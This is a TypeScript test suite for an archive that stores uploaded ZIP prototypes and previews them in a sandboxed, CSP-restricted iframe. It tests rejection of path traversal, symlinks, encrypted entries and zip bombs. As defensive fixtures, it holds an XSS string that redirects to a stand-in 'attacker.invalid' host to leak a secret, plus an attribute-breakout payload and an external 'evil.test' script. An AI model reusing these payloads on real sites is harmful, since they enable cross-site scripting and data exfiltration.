import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { deflateRawSync } from 'node:zlib';
import { runInNewContext } from 'node:vm';
import { parse, type DefaultTreeAdapterTypes as Tree } from 'parse5';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { PrototypeArchive } from './prototype-archive';

type FixtureEntry = { path: string; text?: string; data?: Buffer; mode?: number; flags?: number; advertised?: number };
const crcTable = Array.from({ length: 256 }, (_, initial) => {
  let value = initial;
  for (let i = 0; i < 8; i++) value = (value >>> 1) ^ ((value & 1) ? 0xedb88320 : 0);
  return value >>> 0;
});
function zip(entries: FixtureEntry[]): Buffer {
  const locals: Buffer[] = []; const centrals: Buffer[] = []; let offset = 0;
  for (const entry of entries) {
    const data = entry.data ?? Buffer.from(entry.text ?? ''); const compressed = deflateRawSync(data);
    let crc = 0xffffffff;
    for (const byte of data) crc = (crc >>> 8) ^ crcTable[(crc ^ byte) & 0xff];
    crc = (crc ^ 0xffffffff) >>> 0;
    const name = Buffer.from(entry.path); const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50); local.writeUInt16LE(20, 4); local.writeUInt16LE(entry.flags ?? 0, 6); local.writeUInt16LE(8, 8);
    local.writeUInt32LE(crc, 14); local.writeUInt32LE(compressed.length, 18); local.writeUInt32LE(entry.advertised ?? data.length, 22); local.writeUInt16LE(name.length, 26);
    locals.push(local, name, compressed);
    const central = Buffer.alloc(46); central.writeUInt32LE(0x02014b50); central.writeUInt16LE(0x0314, 4); central.writeUInt16LE(20, 6);
    central.writeUInt16LE(entry.flags ?? 0, 8); central.writeUInt16LE(8, 10); central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(compressed.length, 20); central.writeUInt32LE(entry.advertised ?? data.length, 24); central.writeUInt16LE(name.length, 28);
    central.writeUInt32LE(((entry.mode ?? 0o100644) << 16) >>> 0, 38); central.writeUInt32LE(offset, 42);
    centrals.push(central, name); offset += local.length + name.length + compressed.length;
  }
  const directory = Buffer.concat(centrals); const end = Buffer.alloc(22); end.writeUInt32LE(0x06054b50);
  end.writeUInt16LE(entries.length, 8); end.writeUInt16LE(entries.length, 10); end.writeUInt32LE(directory.length, 12); end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, directory, end]);
}

function htmlElements(html: string): Tree.Element[] {
  const output: Tree.Element[] = []; const queue: Tree.Node[] = [...parse(html).childNodes];
  while (queue.length) {
    const node = queue.pop()!;
    if ('tagName' in node) output.push(node);
    if ('childNodes' in node) for (const child of node.childNodes) queue.push(child);
  }
  return output;
}

function previewContent(html: string): string {
  const frames = htmlElements(html).filter(node => node.tagName === 'iframe');
  expect(frames, '预览必须由唯一的可信外层 iframe 承载原始页面').toHaveLength(1);
  const frame = frames[0];
  expect(frame.attrs.find(attr => attr.name === 'sandbox')?.value).toBe('allow-scripts');
  const content = frame.attrs.find(attr => attr.name === 'srcdoc')?.value;
  expect(content, '完整原始页面应位于经过属性转义的 srcdoc 中').toBeTypeOf('string');
  return content!;
}

function scriptText(element: Tree.Element): string {
  return element.childNodes.map(node => node.nodeName === '#text' ? (node as Tree.TextNode).value : '').join('');
}

describe('PrototypeArchive', () => {
  let root: string; let archive: PrototypeArchive;
  beforeEach(async () => { root = await mkdtemp(join(tmpdir(), 'flowx-prototype-')); archive = new PrototypeArchive(root); });
  afterEach(async () => { await rm(root, { recursive: true, force: true }); });

  it('以可信 CSP 外层隔离原型，完整转义 srcdoc 且不允许原型污染外层脚本', async () => {
    const attack = '<script>window.location="https://attacker.invalid/leak?secret=1"</script><p title="&quot;><script>attack()</script>">原型</p>';
    await archive.save('draft1', 1, zip([{ path: 'index.html', text: attack }]), 'untrusted.zip');
    const result = await archive.preview('draft1', 1, 'index.html');
    const outer = htmlElements(result.html);
    const head = outer.find(node => node.tagName === 'head')!;
    const firstElement = head.childNodes.find(node => 'tagName' in node) as Tree.Element;
    expect(firstElement.tagName).toBe('meta');
    expect(firstElement.attrs.find(attr => attr.name === 'http-equiv')?.value).toBe('Content-Security-Policy');
    const policy = firstElement.attrs.find(attr => attr.name === 'content')?.value ?? '';
    expect(policy).toContain("frame-src 'none'"); expect(policy).toContain("connect-src 'none'");
    expect(policy).toContain('img-src data:'); expect(policy).toContain("script-src 'unsafe-inline' data:");
    const outerScripts = outer.filter(node => node.tagName === 'script');
    expect(outerScripts).toHaveLength(1);
    expect(scriptText(outerScripts[0])).not.toContain('attacker.invalid');
    expect(outer.filter(node => node.tagName === 'p')).toHaveLength(0);
    const inner = previewContent(result.html);
    expect(inner).toContain('window.location="https://attacker.invalid/leak?secret=1"');
    expect(inner).toContain('title="&quot;><script>attack()</script>"');
    expect(result.html).toContain('srcdoc="&lt;html&gt;');
    expect(scriptText(outer.find(node => node.tagName === 'style')!)).toContain('height:100%');
    expect(result.warnings.join(' ')).toContain('外层');
  });

  it('可信外层仅转发来自内层窗口的合法页面跳转消息', async () => {
    await archive.save('draft1', 1, zip([{ path: 'index.html', text: '<p>hello</p>' }]), 'navigation.zip');
    const html = (await archive.preview('draft1', 1, 'index.html')).html;
    const script = htmlElements(html).find(node => node.tagName === 'script')!;
    const innerWindow = {}; const messages: unknown[] = [];
    let listener: ((event: { source: unknown; data: unknown }) => void) | undefined;
    runInNewContext(scriptText(script), {
      document: { getElementById: () => ({ contentWindow: innerWindow }) },
      window: { addEventListener: (_name: string, handler: typeof listener) => { listener = handler; } },
      parent: { postMessage: (message: unknown) => messages.push(message) },
    });
    expect(listener).toBeTypeOf('function');
    listener!({ source: {}, data: { type: 'flowx-prototype-navigate', path: 'forged.html' } });
    for (const data of [null, 'text', { type: 'other', path: 'next.html' }, { type: 'flowx-prototype-navigate', path: {} }, { type: 1, path: 'next.html' }]) listener!({ source: innerWindow, data });
    expect(messages).toEqual([]);
    listener!({ source: innerWindow, data: { type: 'flowx-prototype-navigate', path: 'pages/next.html', untrustedExtra: 'discard' } });
    expect(messages).toEqual([{ type: 'flowx-prototype-navigate', path: 'pages/next.html' }]);
    const topWindow = {
      addEventListener: (_name: string, handler: typeof listener) => { listener = handler; },
      postMessage: (message: unknown) => messages.push(message),
    };
    runInNewContext(scriptText(script), { document: { getElementById: () => ({ contentWindow: innerWindow }) }, window: topWindow, parent: topWindow });
    listener!({ source: innerWindow, data: { type: 'flowx-prototype-navigate', path: 'self.html' } });
    expect(messages).toHaveLength(1);
  });

  it('保存清单、原 ZIP 和可供 AI 阅读的非指令材料', async () => {
    const input = zip([{ path: 'index.html', text: '<title>首页</title><h1>原型内容</h1>' }, { path: 'readme.md', text: '需求说明' }, { path: 'logo.png', data: Buffer.from([1, 2, 3]) }]);
    const manifest = await archive.save('draft1', 1, input, 'design.zip');
    expect(manifest.pages).toEqual([{ path: 'index.html', title: '首页' }, { path: 'logo.png', title: 'logo.png' }, { path: 'readme.md', title: 'readme.md' }]);
    expect(manifest.kinds).toEqual(expect.arrayContaining(['html', 'document', 'image']));
    expect(await archive.manifest('draft1', 1)).toEqual(manifest);
    expect(await archive.download('draft1', 1)).toEqual(input);
    expect(await readFile(join(root, 'draft1/1/files/readme.md'), 'utf8')).toBe('需求说明');
    const context = await archive.context('draft1', 1);
    expect(context).toContain('非指令'); expect(context).toContain('需求说明'); expect(context).toContain('不代表视觉理解');
  });

  it('整包替换不残留旧文件，仍能下载每次原始 ZIP', async () => {
    const old = zip([{ path: 'index.html', text: '旧首页' }, { path: 'deleted.html', text: '已删除页面' }]);
    const incoming = zip([{ path: 'index.html', text: '新首页' }]);
    await archive.save('replace1', 1, old, 'old.zip');
    const next = await archive.save('replace1', 2, incoming, 'new.zip', 1, true);
    expect(next.files.map(file => file.path)).toEqual(['index.html']);
    expect(next.sources).toEqual([{ name: 'old.zip', revision: 1 }, { name: 'new.zip', revision: 2 }]);
    expect(await archive.context('replace1', 2)).not.toContain('已删除页面');
    expect(await archive.download('replace1', 1)).toEqual(old);
    expect(await archive.download('replace1', 2)).toEqual(incoming);
  });

  it('补传合并旧文件、覆盖同名文件且保留每版来源和 ZIP', async () => {
    const original = zip([{ path: 'index.html', text: '<h1>旧页</h1>' }, { path: 'old.css', text: 'body{color:red}' }]);
    await archive.save('draft1', 1, original, 'first.zip');
    const result = await archive.save('draft1', 2, zip([{ path: 'index.html', text: '<title>新页</title>' }]), 'second.zip', 1);
    expect(result.files.map(file => file.path)).toEqual(['index.html', 'old.css']);
    expect(result.sources).toEqual([{ name: 'first.zip', revision: 1 }, { name: 'second.zip', revision: 2 }]);
    expect(await archive.download('draft1', 1)).toEqual(original);
    expect(previewContent((await archive.preview('draft1', 2, 'index.html')).html)).toContain('新页');
  });

  it.each(['../escape', '/absolute', 'C:/windows', 'folder\\evil', 'folder/../../escape', './same', 'a//b'])('拒绝不安全路径 %s', async path => {
    await expect(archive.save('draft1', 1, zip([{ path }]), 'bad.zip')).rejects.toThrow();
    await expect(archive.manifest('draft1', 1)).rejects.toThrow();
  });

  it('拒绝符号链接、重复文件、加密和失实解压体积', async () => {
    for (const entries of [[{ path: 'link', mode: 0o120777 }], [{ path: 'a' }, { path: 'a' }], [{ path: 'secret', flags: 1 }], [{ path: 'bomb', data: Buffer.alloc(6 * 1024 * 1024), advertised: 1 }]]) {
      await expect(archive.save('draft1', 1, zip(entries), 'bad.zip')).rejects.toThrow();
    }
  });

  it('拒绝单文件超限、数量超限、ZIP超限和版本路径越界', async () => {
    await expect(archive.save('draft1', 1, zip([{ path: 'huge', data: Buffer.alloc(5 * 1024 * 1024 + 1) }]), 'bad.zip')).rejects.toThrow();
    await expect(archive.save('draft1', 1, zip(Array.from({ length: 1501 }, (_, i) => ({ path: `${i}` }))), 'bad.zip')).rejects.toThrow();
    await expect(archive.save('draft1', 1, Buffer.alloc(20 * 1024 * 1024 + 1), 'bad.zip')).rejects.toThrow();
    await expect(archive.save('../escape', 1, zip([]), 'bad.zip')).rejects.toThrow();
    await expect(archive.save('draft1', -1, zip([]), 'bad.zip')).rejects.toThrow();
  });

  it('保留 HTML/CSS/图片/本地脚本和相对多页导航，并阻止网络资源', async () => {
    await archive.save('draft1', 1, zip([
      { path: 'pages/index.html', text: '<html><head><link rel="stylesheet" href="../style.css"><script src="../app.js"></script></head><body><img src="../logo.png"><a href="next.html">下一页</a><script src="https://evil.test/x.js"></script></body></html>' },
      { path: 'pages/next.html', text: '<title>第二页</title>' },
      { path: 'style.css', text: '@import "nested.css"; body{background:url(logo.png)}' },
      { path: 'nested.css', text: '@import "style.css"; h1{color:red}' },
      { path: 'logo.png', data: Buffer.from([1, 2, 3]) },
      { path: 'app.js', text: 'document.body.dataset.ready="yes"' },
    ]), 'site.zip');
    const result = await archive.preview('draft1', 1, 'pages/index.html');
    const content = previewContent(result.html);
    expect(content).toContain('Content-Security-Policy'); expect(content).toContain('connect-src');
    expect(content).toContain('data:image/png;base64,AQID'); expect(content).toContain('h1{color:red}');
    expect(content).toContain('document.body.dataset.ready'); expect(content).toContain('flowx-prototype-navigate');
    expect(content).toContain('pages/next.html'); expect(content).not.toContain('src="https://evil');
    expect(result.warnings.join(' ')).toMatch(/循环|深度/); expect(result.warnings.join(' ')).toMatch(/外部|网络/);
    const surfaces = await archive.surfaces('draft1', 1);
    expect(surfaces[0]?.pages.some(page => previewContent(page.html).includes('第二页'))).toBe(true);
  });

  it('静态打包包内 JS 模块依赖，不读取包外或执行脚本', async () => {
    await archive.save('draft1', 1, zip([
      { path: 'index.html', text: '<script type="module" src="./src/main.js"></script>' },
      { path: 'src/main.js', text: 'import { name } from "./name.js"; document.title=name;' },
      { path: 'src/name.js', text: 'export const name="原始模块";' },
    ]), 'modules.zip');
    const result = await archive.preview('draft1', 1, 'index.html');
    expect(previewContent(result.html)).toContain('原始模块'); expect(previewContent(result.html)).not.toContain('src="./src/main.js"');
  });

  it('经典脚本保留全局函数，内联模块也静态打包包内依赖', async () => {
    await archive.save('draft1', 1, zip([
      { path: 'index.html', text: '<script src="actions.js"></script><button onclick="openPage()">打开</button><script type="module">import {name} from "./name.js"; document.title=name;</script>' },
      { path: 'actions.js', text: 'function openPage(){document.body.dataset.open="yes"}' },
      { path: 'name.js', text: 'export const name="模块标题";' },
    ]), 'globals.zip');
    const result = await archive.preview('draft1', 1, 'index.html');
    expect(previewContent(result.html)).toContain('<script>function openPage()');
    expect(previewContent(result.html)).toContain('模块标题');
  });

  it('失败补传或重复版本不会清理已有版本', async () => {
    await archive.save('draft1', 1, zip([{ path: 'index.html', text: 'existing' }]), 'first.zip');
    await expect(archive.save('draft1', 1, zip([{ path: 'index.html', text: 'replacement' }]), 'again.zip')).rejects.toThrow();
    await expect(archive.save('draft1', 2, zip([{ path: '../escape' }]), 'bad.zip', 1)).rejects.toThrow();
    expect(previewContent((await archive.preview('draft1', 1, 'index.html')).html)).toContain('existing');
  });

  it('包外静态依赖不会被读取，预览返回清晰警告', async () => {
    await archive.save('draft1', 1, zip([
      { path: 'index.html', text: '<script type="module" src="app.js"></script>' },
      { path: 'app.js', text: 'import secret from "../../package.json"; document.title=secret.name;' },
    ]), 'outside.zip');
    const result = await archive.preview('draft1', 1, 'index.html');
    expect(result.warnings.join(' ')).toContain('无法离线打包');
    expect(result.html).not.toContain('flowx-api');
  });

  it('模块静态导入本地图片和样式时保留离线资源', async () => {
    await archive.save('draft1', 1, zip([
      { path: 'index.html', text: '<script type="module" src="src/app.js"></script>' },
      { path: 'src/app.js', text: 'import logo from "../logo.png"; import "../style.css"; document.body.innerHTML=`<img src="${logo}">`;' },
      { path: 'logo.png', data: Buffer.from([1, 2, 3]) },
      { path: 'style.css', text: 'body { background: url(logo.png); color: red; }' },
    ]), 'imports.zip');
    const result = await archive.preview('draft1', 1, 'index.html');
    expect(previewContent(result.html)).toContain('data:image/png;base64,AQID');
    expect(previewContent(result.html)).toContain('color: red');
    expect(result.warnings.join(' ')).not.toContain('无法离线打包');
  });

  it('大图仍可在需求中预览，工作流以小占位页接续而不失败', async () => {
    await archive.save('draft1', 1, zip([{ path: 'large.png', data: Buffer.alloc(4 * 1024 * 1024) }]), 'large.zip');
    expect(Buffer.byteLength((await archive.preview('draft1', 1, 'large.png')).html)).toBeGreaterThan(5 * 1024 * 1024);
    const surfaces = await archive.surfaces('draft1', 1);
    expect(surfaces[0]?.pages[0]?.id).toBe('large.png');
    expect(surfaces[0]?.pages[0]?.html.includes('此页资源较大，请在需求详情预览或下载原包')).toBe(true);
    expect(Buffer.byteLength(surfaces[0]!.pages[0]!.html)).toBeLessThan(5 * 1024 * 1024);
  });

  it('保留 defer 经典脚本及模块脚本在 DOM 解析后的执行时序', async () => {
    await archive.save('draft1', 1, zip([
      { path: 'index.html', text: '<script defer src="classic.js"></script><script type="module" src="module.js"></script>' },
      { path: 'classic.js', text: 'document.body.dataset.classic="yes"' },
      { path: 'module.js', text: 'document.body.dataset.module="yes"' },
    ]), 'timing.zip');
    const result = await archive.preview('draft1', 1, 'index.html');
    expect(previewContent(result.html)).toContain('src="data:text/javascript;base64,');
    expect(previewContent(result.html)).toContain('defer=""');
    expect(previewContent(result.html)).toContain('<script type="module">');
  });

  it('拒绝解压总量及补传合并总量超限', async () => {
    const block = Buffer.alloc(5 * 1024 * 1024);
    await expect(archive.save('draft1', 1, zip(Array.from({length:13}, (_, i) => ({path:`${i}.bin`,data:block}))), 'big.zip')).rejects.toThrow();
    await archive.save('draft1', 1, zip(Array.from({length:12}, (_, i) => ({path:`${i}.bin`,data:block}))), 'full.zip');
    await expect(archive.save('draft1', 2, zip([{path:'extra.txt',text:'extra'}]), 'extra.zip', 1)).rejects.toThrow();
    expect((await archive.manifest('draft1', 1)).files).toHaveLength(12);
  }, 30000);

  it('图片/文档可作为设计页面并仅删除指定版本', async () => {
    await archive.save('draft1', 1, zip([{ path: 'screenshot.png', data: Buffer.from([1]) }, { path: 'brief.md', text: '<script>danger()</script>' }]), 'assets.zip');
    await archive.save('draft1', 2, zip([{ path: 'next.md', text: 'next' }]), 'next.zip', 1);
    const surfaces = await archive.surfaces('draft1', 1);
    expect(surfaces[0]?.pages).toHaveLength(2);
    expect(surfaces[0]?.pages.map(page => previewContent(page.html)).join(' ')).toContain('&lt;script&gt;');
    await archive.remove('draft1', 2);
    expect((await archive.manifest('draft1', 1)).sources).toHaveLength(1);
    await expect(archive.manifest('draft1', 2)).rejects.toThrow();
  });
  it('图片和文档列入确认页预览清单', async () => {
    const manifest = await archive.save('draft1', 1, zip([{ path: 'screen.png', data: Buffer.from([1]) }, { path: 'brief.md', text: '# 需求' }]), 'materials.zip');
    expect(manifest.pages.map(page => page.path)).toEqual(['screen.png', 'brief.md']);
  });
  it.each(['screen#1.png', 'screen?size=1.png', 'screen%.png', 'assets/screen%23literal.png'])('独立图片预览按原始文件路径读取特殊字符文件名 %s', async path => {
    const image = Buffer.from([1, 2, 3]);
    await archive.save('draft1', 1, zip([{ path, data: image }]), 'special-names.zip');
    const result = await archive.preview('draft1', 1, path);
    const content = previewContent(result.html);
    const element = htmlElements(content).find(node => node.tagName === 'img')!;
    expect(element.attrs.find(attr => attr.name === 'src')?.value).toBe('data:image/png;base64,AQID');
    expect(element.attrs.find(attr => attr.name === 'alt')?.value).toBe(path);
    expect(result.warnings.join(' ')).not.toContain('找不到包内资源');
  });
  it('HTML 图片引用仍按 URL 规则解码路径并忽略查询和片段', async () => {
    await archive.save('draft1', 1, zip([
      { path: 'index.html', text: '<img src="screen%231.png?size=large#preview"><img src="screen%25.png"><img src="screen%3Fsize%3D1.png">' },
      { path: 'screen#1.png', data: Buffer.from([1]) },
      { path: 'screen%.png', data: Buffer.from([2]) },
      { path: 'screen?size=1.png', data: Buffer.from([3]) },
    ]), 'url-references.zip');
    const content = previewContent((await archive.preview('draft1', 1, 'index.html')).html);
    const images = htmlElements(content).filter(node => node.tagName === 'img');
    expect(images.map(node => node.attrs.find(attr => attr.name === 'src')?.value).sort()).toEqual([
      'data:image/png;base64,AQ==', 'data:image/png;base64,Ag==', 'data:image/png;base64,Aw==',
    ]);
  });

  it('默认首页优先选择包内 index HTML，图片和文档排在所有 HTML 页面之后', async () => {
    const manifest = await archive.save('draft1', 1, zip([
      { path: 'assets/logo.svg', text: '<svg></svg>' },
      { path: 'aaa.md', text: '# 材料' },
      { path: 'aaa.html', text: '<title>其他页</title>' },
      { path: 'prototype/index.htm', text: '<title>首页</title>' },
    ]), 'site.zip');
    expect(manifest.pages.map(page => page.path)).toEqual(['prototype/index.htm', 'aaa.html', 'assets/logo.svg', 'aaa.md']);
    expect(manifest.files.map(file => file.path)).toEqual(['aaa.html', 'aaa.md', 'assets/logo.svg', 'prototype/index.htm']);
    expect((await archive.surfaces('draft1', 1))[0].pages[0].id).toBe('prototype/index.htm');
  });
  it('AI材料保留链接与表单属性，清单和分隔符也计入整体预算', async () => {
    await archive.save('draft1', 1, zip([{ path: 'index.html', text: '<a href="detail.html">查看</a><form action="/orders"><input name="email" type="email" required><button data-action="delete">删除</button></form>' }]), 'form.zip');
    const context = await archive.context('draft1', 1);
    expect(context).toContain('href="detail.html"'); expect(context).toContain('name="email"'); expect(context).toContain('required');
    const prefix = ['a', 'b', 'c', 'd'].map(letter => letter.repeat(100)).join('/') + '/';
    await archive.save('long', 1, zip(Array.from({ length: 1500 }, (_, i) => ({ path: `${prefix}${i}.md`, text: 'x' }))), 'paths.zip');
    expect((await archive.context('long', 1)).length).toBeLessThanOrEqual(100000);
  }, 30000);
  it('工作流原型总预算包含所有后续占位页', async () => {
    const entries = Array.from({ length: 100 }, (_, i) => ({ path: `${String(i).padStart(2, '0')}.html`, text: i < 4 ? `<body>${'x'.repeat(5241000)}</body>` : i === 4 ? `<body>${'x'.repeat(4190000)}</body>` : '<body>小页</body>' }));
    await archive.save('draft1', 1, zip(entries), 'pages.zip');
    const pages = (await archive.surfaces('draft1', 1))[0].pages;
    expect(pages.reduce((total, page) => total + Buffer.byteLength(page.html), 0)).toBeLessThanOrEqual(24 * 1024 * 1024);
  }, 30000);

});
